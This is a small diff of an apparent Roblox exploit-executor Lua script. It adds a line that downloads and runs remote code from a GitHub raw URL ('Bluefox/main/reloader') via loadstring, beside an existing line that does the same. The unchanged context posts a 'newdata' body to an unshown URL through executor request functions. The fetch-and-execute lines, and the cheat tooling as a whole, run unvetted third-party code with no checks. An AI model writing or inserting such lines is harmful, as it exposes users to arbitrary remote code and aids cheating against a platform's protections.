@@ -34,7 +34,7 @@ request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
 	local request = http_request or request or HttpPost or syn.request
 	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/reloader"))();
 loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/bluefox%20script.lua"))();
 
 -- Reload script
